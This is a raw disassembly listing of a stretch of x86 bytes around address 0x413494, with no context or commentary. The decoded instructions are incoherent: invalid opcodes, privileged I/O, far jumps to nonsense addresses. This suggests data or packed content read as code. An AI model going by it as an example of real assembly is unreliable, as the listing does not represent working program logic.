  413494:	outs   dx,DWORD PTR ds:[esi]
  413495:	mov    ds:0x8d1112a3,al
  41349a:	jge    0x4134fd
  41349c:	pushf  
  41349d:	pop    edi
  41349e:	out    dx,eax
  41349f:	dec    eax
  4134a0:	fild   WORD PTR [edx]
  4134a2:	call   0x399d:0x34ab0d4b
  4134a9:	sar    DWORD PTR [ecx-0x6f],0x7b
  4134ad:	jecxz  0x413473
  4134af:	push   esp
  4134b0:	jb     0x4134a8
  4134b2:	cmp    eax,0x462ddae9
  4134b7:	xor    dh,BYTE PTR [ebx+0x32]
  4134ba:	test   eax,0xd4bdc16
  4134bf:	cwde   
  4134c0:	sub    BYTE PTR [edi],bl
  4134c2:	or     eax,DWORD PTR [esi]
  4134c4:	ins    BYTE PTR es:[edi],dx
  4134c5:	fcom   QWORD PTR [ecx-0x44]
  4134c8:	out    0x89,eax
  4134ca:	push   0x7b366935
  4134cf:	outs   dx,BYTE PTR ds:[esi]
  4134d0:	daa    
  4134d1:	mov    dh,0xb1
  4134d3:	sbb    al,0xb4
  4134d5:	inc    ebp
  4134d6:	icebp  
  4134d7:	(bad)  
  4134d8:	xchg   ebx,eax
  4134d9:	iret   
  4134da:	inc    edx
  4134db:	scas   al,BYTE PTR es:[edi]
  4134dc:	fwait
  4134dd:	in     eax,0x2b
  4134df:	push   edx
  4134e0:	mov    WORD PTR [edx+edx*8-0x47],gs
  4134e4:	mov    ds:0xde01cd02,al
  4134e9:	jo     0x413472
  4134eb:	add    eax,0xceaacb47
  4134f0:	jne    0x4134b9
  4134f2:	mov    eax,0xdf529653
  4134f7:	push   DWORD PTR [esi-0x4548124d]
  4134fd:	or     ah,bl
  4134ff:	cmp    ebp,ebx
  413501:	cmp    BYTE PTR [esi+eiz*1+0x2e],0xfc
  413506:	dec    esi
  413507:	pop    ebp
  413508:	pop    esi
  413509:	stos   BYTE PTR es:[edi],al
  41350a:	rcr    BYTE PTR [eax+0x33e059a9],0xba
  413511:	dec    ecx
  413512:	ret    
  413513:	sbb    BYTE PTR [ebp+0x3b],0xeb
  413517:	retf   
  413518:	dec    edi
  413519:	(bad)  
  41351a:	je     0x41358f
  41351c:	cmp    DWORD PTR [ebx],esi
  41351e:	je     0x413578
  413520:	and    al,0x80
  413522:	test   al,0xdc
  413524:	in     eax,dx
  413525:	in     eax,dx
  413526:	pop    edx
  413527:	inc    ebx
  413528:	and    al,0x87
  41352a:	cld    
  41352b:	jmp    0x26b800b6
  413530:	add    al,0x94
  413532:	xor    ch,ch
  413534:	dec    ecx
  413535:	xchg   esi,eax
  413536:	add    al,0x20
  413538:	(bad)  
  413539:	shl    DWORD PTR [ecx+0x8],cl
  41353c:	pop    ds
  41353d:	dec    ecx
  41353e:	sbb    dh,BYTE PTR [esi-0x5a7b61ad]
  413544:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  413546:	test   DWORD PTR [esi-0x5a],esp
  413549:	pop    edx
  41354a:	add    al,0x2
  41354c:	dec    ebp
  41354d:	popa   
  41354e:	mov    ecx,DWORD PTR [eax-0x21b35acd]
  413554:	mov    WORD PTR ds:0xc1ca1ec7,ds
  41355a:	and    ax,0xf643
  41355e:	add    BYTE PTR [ebx+0x59a3a67],cl
  413564:	xchg   ecx,eax
  413565:	stc    
  413566:	push   eax
  413567:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413568:	mov    edx,0x4c03d701
  41356d:	jb     0x413505
  41356f:	or     esi,DWORD PTR [eax+0x17dbcda7]
  413575:	push   edx
  413576:	rcr    ch,1
  413578:	aaa    
  413579:	popf   
  41357a:	sbb    DWORD PTR [edi],ebx
  41357c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41357d:	mov    cl,0x3b
  41357f:	mov    al,ds:0x170df60c
  413584:	js     0x413538
  413586:	es test eax,0x2657a932
  41358c:	sbb    eax,DWORD PTR [esi]
  41358e:	or     al,0xf7
  413590:	push   ss
  413591:	(bad)  
  413592:	xchg   ebp,eax
  413593:	dec    esi
  413594:	jns    0x4135eb
  413596:	and    esi,DWORD PTR [ecx-0x2b]
  413599:	mov    bl,0x8d
  41359b:	pop    edx
  41359c:	xor    BYTE PTR [esi],bh
  41359e:	push   ds
  41359f:	push   0xcdf6313d
  4135a4:	test   eax,0x9fff7c9e
  4135a9:	aam    0x42
  4135ab:	lahf   
  4135ac:	xor    BYTE PTR [edx+edx*8+0x6179cd80],dl
  4135b3:	lods   eax,DWORD PTR ds:[esi]
  4135b4:	push   edi
  4135b5:	inc    esp
  4135b6:	inc    esi
  4135b7:	bnd jo 0x4135f8
  4135ba:	sub    eax,0xa2e5445e
  4135bf:	xchg   ecx,eax
  4135c0:	nop
  4135c1:	add    BYTE PTR [esi-0x7c],dh
  4135c4:	iret   
  4135c5:	mov    eax,ds:0xf70399ba
  4135ca:	push   ebp
  4135cb:	jecxz  0x413607
  4135cd:	nop
  4135ce:	mov    al,0x8e
  4135d0:	je     0x413573
  4135d2:	inc    eax
  4135d3:	xor    ecx,DWORD PTR [edx+0x10]
  4135d6:	ja     0x413590
  4135d8:	xchg   edx,eax
  4135d9:	mov    DWORD PTR [ebx],ebp
  4135db:	pop    ds
  4135dc:	pop    eax
  4135dd:	les    eax,FWORD PTR ds:0x227954be
  4135e3:	icebp  
  4135e4:	(bad)  
  4135e5:	and    DWORD PTR [edi],edx
  4135e7:	ror    al,cl
  4135e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135ea:	push   esi
  4135eb:	or     eax,0x5e29f934
  4135f0:	pop    ss
  4135f1:	aam    0xf1
  4135f3:	push   eax
  4135f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135f5:	imul   edx,esp,0x85f27b0e
  4135fb:	(bad)
  4135ff:	in     eax,0x23
  413601:	popa   
  413602:	fs jo  0x413638
  413605:	sub    ebx,DWORD PTR [ecx-0x1152a3a6]
  41360b:	imul   ecx,DWORD PTR [eax+eax*1+0x768e068c],0xc20f70ff
  413616:	cmc    
  413617:	inc    edi
  413618:	das    
  413619:	jle    0x413611
  41361b:	pop    ds
  41361c:	stos   BYTE PTR es:[edi],al
  41361d:	loope  0x41365d
  41361f:	inc    edx
  413620:	fsubp  st(2),st
  413622:	outs   dx,DWORD PTR ds:[esi]
  413623:	leave  
  413624:	les    edi,FWORD PTR ds:[ecx-0x4b]
  413628:	hlt    
  413629:	sbb    al,0x4b
  41362b:	sbb    dl,BYTE PTR [edi+0x11f660c9]
  413631:	mov    ecx,DWORD PTR [eax+0x4]
  413634:	lods   al,BYTE PTR ds:[esi]
  413635:	fisub  WORD PTR [edx-0xf]
  413638:	dec    eax
  413639:	ds mov edx,0xde7aead6
  41363f:	xchg   BYTE PTR [edi-0x22],dh
  413642:	inc    edi
  413643:	and    al,0x84
  413645:	shr    DWORD PTR [edx+0x6d],0xef
  413649:	xor    eax,0x29e8699
  41364e:	ins    DWORD PTR es:[edi],dx
  41364f:	aad    0x41
  413651:	fnstsw WORD PTR [ebp-0x3afc2a55]
  413657:	int3   
  413658:	dec    ebx
  413659:	xor    al,0x34
  41365b:	es enter 0xe5ed,0xa9
  413660:	outs   dx,DWORD PTR ds:[esi]
  413661:	mov    ch,0xa2
  413663:	mov    ch,0xbc
  413665:	rol    bh,cl
  413667:	(bad)  
  413668:	cld    
  413669:	ret    
  41366a:	jmp    DWORD PTR [edx+0x208fe805]
  413670:	call   0xeee5:0x2659d6be
  413677:	push   es
  413678:	ins    BYTE PTR es:[edi],dx
  413679:	and    DWORD PTR [edi-0x5e7ab9e7],eax
  41367f:	stc    
  413680:	(bad)  
  413681:	ins    DWORD PTR es:[edi],dx
  413682:	jge    0x41360b
  413684:	mov    edi,0x3ef605bd
  413689:	jmp    0x41368a
  41368b:	(bad)  
  41368d:	cmp    al,0xa3
  41368f:	xor    BYTE PTR [ebx+ebx*1],cl
  413692:	js     0x413712
  413694:	(bad)  
  413695:	enter  0x97cb,0x85
  413699:	jecxz  0x41367a
  41369b:	mov    bl,BYTE PTR [esi]
  41369d:	push   cs
  41369e:	mov    ecx,0x2ffb02c4
  4136a3:	pop    ebp
  4136a4:	cld    
  4136a5:	mov    ebp,0xb6fa5c35
  4136aa:	pop    esp
  4136ab:	push   esi
  4136ac:	popf   
  4136ad:	frstor [edx]
  4136af:	inc    ecx
  4136b0:	lods   eax,DWORD PTR ds:[esi]
  4136b1:	pop    ds
  4136b2:	ins    BYTE PTR es:[edi],dx
  4136b3:	pop    ss
  4136b4:	inc    ebx
  4136b5:	jecxz  0x413672
  4136b7:	in     al,dx
  4136b8:	dec    eax
  4136b9:	imul   edx,DWORD PTR [edi],0xfe2f0caf
  4136bf:	sbb    eax,0xcdd96784
  4136c4:	lds    edi,FWORD PTR [ebp-0x20afa96d]
  4136ca:	jg     0x4136e4
  4136cc:	test   al,0x50
  4136ce:	repz mov esi,0xc53a4c4c
  4136d4:	pop    ebp
  4136d5:	jno    0x41368c
  4136d7:	xchg   ecx,eax
  4136d8:	test   DWORD PTR [esi-0x38],edi
  4136db:	mov    cl,0x31
  4136dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136de:	inc    edi
  4136df:	push   es
  4136e0:	dec    eax
  4136e1:	mov    ds:0x835ce9d3,eax
  4136e6:	xor    eax,0x8ae906c6
  4136eb:	test   bl,dh
  4136ed:	sbb    eax,0xfe6919c7
  4136f2:	add    al,0xc0
  4136f4:	cmp    edi,ecx
  4136f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136f7:	pushf  
  4136f8:	mov    al,ds:0xbf79e623
  4136fd:	pusha  
  4136fe:	mov    eax,ds:0x51eada7b
  413703:	cmp    dl,ah
  413705:	test   eax,eax
  413707:	(bad)  
  413709:	push   edx
  41370a:	sar    BYTE PTR [eax+0x35],cl
  41370d:	jecxz  0x4136fc
  41370f:	jns    0x413710
  413711:	inc    ebp
  413712:	mov    dh,0xab
  413714:	das    
  413715:	rcl    BYTE PTR ds:0xd26a81c0,0xd8
  41371c:	pop    esp
  41371d:	jle    0x413727
  41371f:	aas    
  413720:	cli    
  413721:	and    ch,cl
  413723:	jb     0x413757
  413725:	mov    ebp,0x20546e9d
  41372a:	pop    ds
  41372b:	dec    BYTE PTR [ebp+0x4b130fcb]
  413731:	sub    eax,ebp
  413733:	mov    eax,ds:0x394c4dee
  413738:	cmp    ah,ah
  41373a:	mov    ds:0xde9e0095,eax
  41373f:	push   ebp
  413740:	xchg   esp,eax
  413741:	push   es
  413742:	gs bnd jno 0x413777
  413746:	pop    ds
  413747:	cmp    edi,esp
  413749:	add    ch,cl
  41374b:	adc    eax,0x78e2d519
  413750:	shl    BYTE PTR [ebp-0xb646abc],0xd4
  413757:	aas    
  413758:	popf   
  413759:	mov    edi,0xb8297645
  41375e:	rol    BYTE PTR [edx+0xe],0x2b
  413762:	lea    edi,fs:[ecx-0x3e]
  413766:	pop    ebx
  413767:	dec    esi
  413768:	fisubr DWORD PTR [edx+0x41]
  41376b:	aad    0x2a
  41376d:	sbb    edx,eax
  41376f:	aad    0xb3
  413771:	dec    ebx
  413772:	es mov bh,0x91
  413775:	and    al,0xf0
  413777:	lods   eax,DWORD PTR ds:[esi]
  413778:	jnp    0x41378b
  41377a:	push   0xffffff9e
  41377c:	rcr    DWORD PTR [ecx],1
  41377e:	mov    edi,ecx
  413780:	xor    BYTE PTR [esi+0x648eabb7],0xcb
  413787:	test   al,0xfc
  413789:	mov    ch,0x16
  41378b:	dec    edx
  41378c:	dec    ebp
  41378d:	ret    0xb11b
  413790:	cmp    al,0x9e
  413792:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413793:	xor    al,0xe2
  413795:	jne    0x41373d
  413797:	in     eax,dx
  413798:	repz fmul DWORD PTR [ebx-0x2e]
  41379c:	retf   0x52c8
  41379f:	outs   dx,DWORD PTR ds:[esi]
  4137a0:	and    bh,al
  4137a2:	dec    edi
  4137a3:	pushf  
  4137a4:	sub    al,0xc2
  4137a6:	inc    esi
  4137a7:	repnz mov es,eax
  4137aa:	push   ss
  4137ab:	loopne 0x413816
  4137ad:	ret    
  4137ae:	inc    ebx
  4137af:	test   DWORD PTR [ebp+esi*4+0x6f],0x39406e42
  4137b7:	fidiv  WORD PTR [esi+0x41]
  4137ba:	and    dh,BYTE PTR [esi-0x5e8f56c3]
  4137c0:	icebp  
  4137c1:	dec    ebx
  4137c2:	push   eax
  4137c3:	push   ebp
  4137c4:	mov    dl,0x98
  4137c6:	test   BYTE PTR [ebx+edi*2-0x3e],ch
  4137ca:	je     0x413847
  4137cc:	sahf   
  4137cd:	jb     0x4137ce
  4137cf:	lahf   
  4137d0:	out    dx,al
  4137d1:	lods   eax,DWORD PTR ds:[esi]
  4137d2:	jb     0x4137dc
  4137d4:	(bad)  
  4137d5:	dec    esp
  4137d6:	and    DWORD PTR [eax-0x25],ecx
  4137d9:	sbb    dl,BYTE PTR [edi]
  4137db:	mov    WORD PTR [ebp+0x6c9cade],?
  4137e1:	inc    eax
  4137e2:	mov    ebp,0xe366a26
  4137e7:	adc    eax,0xd295fe86
  4137ec:	sti    
  4137ed:	push   edx
  4137ee:	fadd   QWORD PTR [esi+0x16]
  4137f1:	mov    cl,0x1f
  4137f3:	loopne 0x413844
  4137f5:	adc    ch,BYTE PTR [eax+ecx*4]
  4137f8:	retf   0xcbf6
  4137fb:	sub    DWORD PTR [esi+0x15a49869],ebp
  413801:	jle    0x413820
  413803:	enter  0x655b,0x9f
  413807:	aas    
  413808:	mov    ds:0x9eb03c59,al
  41380d:	pop    ss
  41380e:	inc    ebp
  41380f:	bound  ecx,QWORD PTR [ecx]
  413811:	daa    
  413812:	inc    ecx
  413813:	inc    eax
  413814:	sar    edx,0x3e
  413817:	bound  edi,QWORD PTR [ebx-0x64c84a4c]
  41381d:	scas   eax,DWORD PTR es:[edi]
  41381e:	hlt    
  41381f:	test   edx,0xa6c04aa
  413825:	fimul  DWORD PTR [ebx]
  413827:	pop    ecx
  413828:	ror    DWORD PTR [edx-0x10d982ed],1
  41382e:	clc    
  41382f:	jle    0x41385a
  413831:	pop    eax
  413832:	ror    DWORD PTR [edx+0x6c],0xf
  413836:	ds pop edi
  413838:	mov    bl,0x2a
  41383a:	pusha  
  41383b:	loope  0x41389e
  41383d:	stos   BYTE PTR es:[edi],al
  41383e:	(bad)  
  413840:	fdivr  DWORD PTR ds:0xc1a4bcd3
  413846:	push   ebp
  413847:	dec    ecx
  413848:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413849:	adc    al,0x9e
  41384b:	(bad)  
  41384c:	jp     0x413885
  41384e:	lock pop es
  413850:	and    esp,esp
  413852:	add    edx,DWORD PTR [ecx]
  413854:	mov    eax,0x74083bc2
  413859:	xor    eax,0xe87eabf
  41385e:	xchg   ecx,eax
  41385f:	pop    esp
  413860:	fs mov eax,0x8105471c
  413866:	dec    edx
  413867:	stos   DWORD PTR es:[edi],eax
  413868:	pop    edx
  413869:	in     eax,0x1d
  41386b:	fpatan 
  41386d:	mov    eax,ds:0xa9860807
  413872:	hlt    
  413873:	retf   
  413874:	out    0x5d,eax
  413876:	mov    esi,0x1661d954
  41387b:	pop    ebx
  41387c:	pop    ebp
  41387d:	addr16 dec esp
  41387f:	adc    BYTE PTR [ebx],ch
  413881:	jl     0x4138ef
  413883:	test   ebp,esp
  413885:	mov    dh,0x55
  413887:	scas   al,BYTE PTR es:[edi]
  413888:	test   DWORD PTR [ebx-0x9477bd],edx
  41388e:	or     ebp,DWORD PTR [ebx]
  413890:	inc    edi
  413891:	out    dx,eax
  413892:	or     al,0xa5
  413894:	and    al,0x63
  413896:	fstp   DWORD PTR ds:0x5920ac08
  41389c:	repnz sbb ecx,edx
  41389f:	std    
  4138a0:	mov    dl,0x97
  4138a2:	pop    eax
  4138a3:	and    cl,dh
  4138a5:	inc    ebx
  4138a6:	push   ds
  4138a7:	pop    esi
  4138a8:	gs aaa 
  4138aa:	add    BYTE PTR [esi-0x52],dh
  4138ad:	pop    edx
  4138ae:	repnz out 0x4b,al
  4138b1:	ins    BYTE PTR es:[edi],dx
  4138b2:	xchg   esp,eax
  4138b3:	xchg   ebp,eax
  4138b4:	pop    ebx
  4138b5:	fisttp QWORD PTR [ebx]
  4138b7:	mov    DWORD PTR [ebx+edi*2],edx
  4138ba:	shl    ebp,1
  4138bc:	sbb    eax,0x5caec6ad
  4138c1:	xor    ecx,DWORD PTR [edx]
  4138c3:	ins    DWORD PTR es:[edi],dx
  4138c4:	mov    bh,0xca
  4138c6:	int    0x45
  4138c8:	dec    ebp
  4138c9:	jmp    0x4138fb
  4138cb:	lods   eax,DWORD PTR ds:[esi]
  4138cc:	jge    0x413890
  4138ce:	or     BYTE PTR [ebx+0x760805d9],0xf3
  4138d5:	or     al,0x8d
  4138d7:	sub    ch,BYTE PTR [ebx*4-0x2b314e85]
  4138de:	enter  0xbcfd,0xac
  4138e2:	clc    
  4138e3:	mov    edx,0xc22a3066
  4138e8:	pop    eax
  4138e9:	sbb    al,0x8
  4138eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138ec:	mov    ecx,0xa57b4fff
  4138f1:	icebp  
  4138f2:	ss in  al,dx
  4138f4:	ret    0x9af9
  4138f7:	jl     0x413966
  4138f9:	jl     0x4138b2
  4138fb:	inc    eax
  4138fc:	mov    esp,0x20113331
  413901:	popa   
  413902:	lods   al,BYTE PTR ds:[esi]
  413903:	lods   eax,DWORD PTR ds:[esi]
  413904:	loopne 0x41391a
  413906:	cld    
  413907:	push   ecx
  413908:	rcl    eax,cl
  41390a:	mov    ah,0x1
  41390c:	sub    al,0x81
  41390e:	addr16 call 0x66da2119
  413914:	push   cs
  413915:	ss nop ecx
  413919:	xchg   bh,al
  41391b:	dec    esi
  41391c:	xor    al,0x1d
  41391e:	and    BYTE PTR [edx-0x34],ch
  413921:	int    0xaf
  413923:	dec    edi
  413924:	or     eax,0x47a6de2c
  413929:	xchg   DWORD PTR [edx+edx*8+0x42],ebp
  41392d:	dec    edx
  41392e:	mov    al,dh
  413930:	int    0x7e
  413932:	mov    BYTE PTR es:[eax+0x3e6926af],cl
  413939:	test   dl,0x13
  41393c:	adc    BYTE PTR [edx],ch
  41393e:	das    
  41393f:	bound  esp,QWORD PTR [edi]
  413941:	sub    al,0x7f
  413943:	jno    0x41396e
  413945:	and    BYTE PTR [ebx],bh
  413947:	(bad)  
  413948:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413949:	xor    eax,0xc47fc69
  41394e:	push   ds
  41394f:	icebp  
  413950:	mov    edi,0x44a5d74d
  413955:	mul    DWORD PTR [eax+0x1d27d99d]
  41395b:	mov    ah,0x1b
  41395d:	dec    ecx
  41395e:	or     al,0x8d
  413960:	out    0x10,eax
  413962:	mov    bh,BYTE PTR [ecx+0x34]
  413965:	dec    ebx
  413966:	icebp  
  413967:	sub    DWORD PTR [edi],0xdcabe254
  41396d:	push   ebp
  41396e:	pop    ecx
  41396f:	xor    eax,0xc5395aed
  413974:	pop    esi
  413975:	sahf   
  413976:	cmc    
  413977:	retf   0x6543
  41397a:	in     eax,dx
  41397b:	or     eax,0xcfd65254
  413980:	daa    
  413981:	js     0x4139bb
  413983:	cvtps2pd xmm3,QWORD PTR ds:0xee2c35de
  41398a:	adc    bh,BYTE PTR [ebp-0x1e]
  41398d:	push   ds
  41398e:	cmp    esp,ebx
  413990:	mov    esi,0x56e8a6b2
  413995:	std    
  413996:	bound  eax,QWORD PTR [ebx-0x7ed54a4e]
  41399c:	jmp    0x3712:0xd805437c
  4139a3:	hlt    
  4139a4:	aaa    
  4139a5:	xor    eax,0x468c48c2
  4139aa:	mov    DWORD PTR ds:0x383da0b6,ebp
  4139b0:	imul   ecx,DWORD PTR [ecx-0x643c992],0x75
  4139b7:	(bad)  
  4139b8:	jmp    0x4139d5
  4139ba:	int    0x46
  4139bc:	jp     0x41394c
  4139be:	sbb    DWORD PTR [edx+0x7a],edx
  4139c1:	rcl    ecx,cl
  4139c3:	mov    ah,0x7e
  4139c5:	and    DWORD PTR [ecx+ebx*1-0x4214c7f4],0x24057034
  4139d0:	pusha  
  4139d1:	jl     0x413971
  4139d3:	jae    0x4139ac
  4139d5:	cwde   
  4139d6:	push   ss
  4139d7:	hlt    
  4139d8:	(bad)  
  4139d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139da:	fmul   DWORD PTR [ebx-0x5451d190]
  4139e0:	iret   
  4139e1:	jae    0x4139ee
  4139e3:	mov    esp,0x62aa91e6
  4139e8:	imul   esp,ebx,0x3d0a2662
  4139ee:	mov    ds:0xa9964cdf,eax
  4139f3:	jl     0x4139c8
  4139f5:	pop    ebp
  4139f6:	je     0x413a3c
  4139f8:	add    esi,DWORD PTR [ebp-0x76c7675]
  4139fe:	pop    esp
  4139ff:	push   esi
  413a00:	scas   al,BYTE PTR es:[edi]
  413a01:	repz inc ebx
  413a03:	leave  
  413a04:	adc    cl,BYTE PTR [ecx-0x45]
  413a07:	int3   
  413a08:	popf   
  413a09:	pop    edx
  413a0a:	popf   
  413a0b:	pop    edi
  413a0c:	pushf  
  413a0d:	cmp    al,0x8f
  413a0f:	test   DWORD PTR [edi+eiz*2+0x611c78ee],0x1937f4ae
  413a1a:	dec    ecx
  413a1b:	pop    ss
  413a1c:	push   0xe52ac3c6
  413a21:	cmp    dl,BYTE PTR [esi]
  413a23:	mov    esi,0xbbb3c4f6
  413a28:	pop    esi
  413a29:	mov    ah,0xca
  413a2b:	aas    
  413a2c:	jo     0x413a88
  413a2e:	test   dh,dh
  413a30:	mov    ds:0x38f48e7a,al
  413a35:	nop
  413a36:	stos   BYTE PTR es:[edi],al
  413a37:	(bad)  
  413a39:	inc    edi
  413a3a:	push   eax
  413a3b:	sub    eax,0x8f585b0b
  413a40:	idiv   cl
  413a42:	ss retf 
  413a44:	call   0x88f0:0xbf9896ed
  413a4b:	retf   0x5264
  413a4e:	push   ebp
  413a4f:	cmp    ebp,DWORD PTR [eax]
  413a51:	int    0xa6
  413a53:	cmp    esi,DWORD PTR ds:0x5fe787a1
  413a59:	xchg   ecx,eax
  413a5a:	imul   esi,DWORD PTR [eax],0x220d2696
  413a60:	pop    esp
  413a61:	ins    DWORD PTR es:[edi],dx
  413a62:	into   
  413a63:	fbld   TBYTE PTR [eax-0x67]
  413a66:	loop   0x413ae4
  413a68:	and    eax,0xd919d1ab
  413a6d:	pop    ebx
  413a6e:	fisub  WORD PTR [edi-0x2bb40d2b]
  413a74:	pop    ss
  413a75:	cld    
  413a76:	jno    0x413a5b
  413a78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a79:	or     BYTE PTR [ecx+edi*4+0x13],dl
  413a7d:	(bad)  
  413a7e:	jns    0x413a4f
  413a80:	sub    al,0xc
  413a82:	out    dx,eax
  413a83:	or     al,BYTE PTR [edx+ecx*1-0x45]
  413a87:	div    dl
  413a89:	out    0x38,eax
  413a8b:	cld    
  413a8c:	mov    edx,0x7b01f7be
  413a91:	xor    al,BYTE PTR [ebp+0x6f]
  413a94:	sub    BYTE PTR [ebx],0x2
  413a97:	cmp    ebx,eax
  413a99:	add    bl,BYTE PTR [ebx+0x7554d85a]
  413a9f:	sbb    BYTE PTR [ecx-0x15],0x4c
  413aa3:	inc    esi
  413aa4:	lods   al,BYTE PTR ds:[esi]
  413aa5:	dec    esp
  413aa6:	sbb    BYTE PTR [ebx-0x20],al
  413aa9:	or     BYTE PTR [ebp-0x18],0x54
  413aad:	test   al,0xf2
  413aaf:	js     0x413b2a
  413ab1:	xor    dh,BYTE PTR [eax+0x139d3750]
  413ab7:	push   es
  413ab8:	out    0xa0,al
  413aba:	and    al,0x4d
  413abc:	mov    edx,0x1096db1e
  413ac1:	mov    edx,0xbde933a1
  413ac6:	dec    ecx
  413ac7:	inc    edi
  413ac8:	add    al,0x87
  413aca:	cmp    BYTE PTR [edx-0x3b],al
  413acd:	outs   dx,DWORD PTR ds:[esi]
  413ace:	mov    ds:0x6f673b70,al
  413ad3:	sahf   
  413ad4:	inc    edi
  413ad5:	xor    al,0xda
  413ad7:	cld    
  413ad8:	imul   ecx,DWORD PTR [ecx],0xffffffb8
  413adb:	inc    ebp
  413adc:	jno    0x413abc
  413ade:	ror    ah,0xe2
  413ae1:	adc    bh,0xe9
  413ae4:	ret    
  413ae5:	add    bh,BYTE PTR [ebx+0x3b]
  413ae8:	pusha  
  413ae9:	pop    esi
  413aea:	push   ecx
  413aeb:	cmp    esi,DWORD PTR [esi]
  413aed:	mov    ecx,0x740d1f32
  413af2:	iret   
  413af3:	pusha  
  413af4:	push   edi
  413af5:	sbb    BYTE PTR [edi-0x83a382e],al
  413afb:	dec    esp
  413afc:	pop    ebx
  413afd:	mov    edx,0xb9582085
  413b02:	scas   al,BYTE PTR es:[edi]
  413b03:	int3   
  413b04:	repz or BYTE PTR [edi+0x5f],al
  413b08:	sbb    ebp,0xdf292b54
  413b0e:	ss je  0x413b3b
  413b11:	mov    ds:0x2c8a0191,al
  413b16:	ins    DWORD PTR es:[edi],dx
  413b17:	jb     0x413afa
  413b19:	ss inc ebx
  413b1b:	into   
  413b1c:	adc    BYTE PTR [ecx+0x546d2b6d],ch
  413b22:	aaa    
  413b23:	fwait
  413b24:	inc    esp
  413b25:	jns    0x413ae0
  413b27:	sti    
  413b28:	sub    eax,0x18c934b8
  413b2d:	pop    es
  413b2e:	imul   ebx,DWORD PTR [ecx],0x76
  413b31:	aas    
  413b32:	mov    al,BYTE PTR [edi-0x26]
  413b35:	in     al,0x57
  413b37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b38:	scas   eax,DWORD PTR es:[edi]
  413b39:	jno    0x413ad1
  413b3b:	pushf  
  413b3c:	inc    eax
  413b3d:	mov    ebp,0xff7ad156
  413b42:	dec    edi
  413b43:	mov    eax,0x9198f2d0
  413b48:	xor    DWORD PTR [esi-0x66],eax
  413b4b:	out    dx,eax
  413b4c:	xchg   edi,eax
  413b4d:	push   ebp
  413b4e:	(bad)  
  413b4f:	out    dx,al
  413b50:	push   esi
  413b51:	fisubr WORD PTR [edi+0x54]
  413b54:	mov    edi,0xc851ceb1
  413b59:	push   edx
  413b5a:	xchg   BYTE PTR [edx-0x49],ah
  413b5d:	pop    esi
  413b5e:	or     DWORD PTR [edx+0x7d11332e],eax
  413b64:	test   BYTE PTR [eax+0x42cf46ed],dh
  413b6a:	xor    al,0x87
  413b6c:	enter  0xcef3,0x35
  413b70:	aad    0x4a
  413b72:	jg     0x413b45
  413b74:	inc    edi
  413b75:	retf   0xca9c
  413b78:	xchg   DWORD PTR [esi+0x1e5f2f0d],esi
  413b7e:	popf   
  413b7f:	(bad)  
  413b80:	sbb    ecx,DWORD PTR [edx-0x2de2babd]
  413b86:	aad    0x65
  413b88:	or     DWORD PTR [ecx-0x249ad111],esi
  413b8e:	fs loope 0x413bf9
  413b91:	mov    esi,0x496bdf21
  413b96:	(bad)  
  413b97:	out    0xa6,eax
  413b99:	xor    DWORD PTR [eax],ebx
  413b9b:	stos   DWORD PTR es:[edi],eax
  413b9c:	jp     0x413bb8
  413b9e:	test   eax,0x8c7ee1ef
  413ba3:	mov    ebx,0x202ad63
  413ba8:	pop    ss
  413ba9:	sub    al,0xb6
  413bab:	shr    DWORD PTR [esi],0x8e
  413bae:	lahf   
  413baf:	lahf   
  413bb0:	adc    ecx,esi
  413bb2:	icebp  
  413bb3:	adc    al,0x8b
  413bb5:	lods   al,BYTE PTR ds:[esi]
  413bb6:	(bad)  
  413bb8:	push   0x3a6484dd
  413bbd:	mov    eax,0x1ad35b93
  413bc2:	fadd   QWORD PTR [eax]
  413bc4:	pop    esi
  413bc5:	dec    BYTE PTR [eax-0x48]
  413bc8:	ss mov dh,0x9
  413bcb:	push   ecx
  413bcc:	mov    ecx,0xe4a6a5ab
  413bd1:	pop    ds
  413bd2:	jmp    0x5af38438
  413bd7:	mov    cs:0x4092ca22,eax
  413bdd:	pop    esp
  413bde:	stos   DWORD PTR es:[edi],eax
  413bdf:	sar    BYTE PTR [esi],1
  413be1:	add    dl,BYTE PTR [eax-0x4a]
  413be4:	and    DWORD PTR [ebx+eiz*4-0x2b],edx
  413be8:	aaa    
  413be9:	inc    esp
  413bea:	bound  esi,QWORD PTR [edi+0x387d0b64]
  413bf0:	mov    eax,DWORD PTR [ecx-0x2482efce]
  413bf6:	and    edi,DWORD PTR [ebx+eiz*4+0x38]
  413bfa:	rcl    BYTE PTR [ecx-0x5c8527f],1
  413c00:	bound  edi,QWORD PTR [edi-0x45]
  413c03:	pop    edx
  413c04:	in     eax,dx
  413c05:	lds    ecx,FWORD PTR [ecx+eax*1]
  413c08:	push   ds
  413c09:	cmp    eax,0x4f81a935
  413c0e:	addr16 jmp 0x413c89
  413c11:	out    0xfe,eax
  413c13:	lods   al,BYTE PTR ds:[esi]
  413c14:	and    BYTE PTR [ecx-0x7e],al
  413c17:	mov    bh,dh
  413c19:	cmp    al,0x73
  413c1b:	inc    esi
  413c1c:	imul   ebp,DWORD PTR ds:0x3411cb69,0xe6e37411
  413c26:	data16 mov ch,0x6f
  413c29:	jmp    0x43107879
  413c2e:	jp     0x413be3
  413c30:	gs loop 0x413c8d
  413c33:	cmp    DWORD PTR [edi],edi
  413c35:	mov    eax,ds:0xbd0a4add
  413c3a:	stos   BYTE PTR es:[edi],al
  413c3b:	shl    BYTE PTR [ebp-0x3874940d],1
  413c41:	sbb    dh,BYTE PTR [edx+0xcf4ac8a]
  413c47:	inc    esi
  413c48:	imul   edi,DWORD PTR [edx+0x2b],0xffffffb7
  413c4c:	fs inc eax
  413c4e:	mov    ch,0x7d
  413c50:	loop   0x413c42
